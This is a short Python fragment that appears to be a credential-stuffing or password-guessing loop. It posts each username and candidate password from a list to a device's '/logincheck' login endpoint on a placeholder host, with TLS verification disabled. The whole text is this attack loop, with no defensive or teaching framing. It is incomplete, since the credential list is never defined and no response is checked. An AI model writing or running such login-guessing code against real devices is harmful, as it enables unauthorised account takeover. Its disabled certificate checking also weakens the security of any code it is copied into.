import requests
session = requests.Session()
for account, candidate in credential_pairs:
    response = session.post("https://device.invalid/logincheck", data={"username": account, "secretkey": candidate}, verify=False)
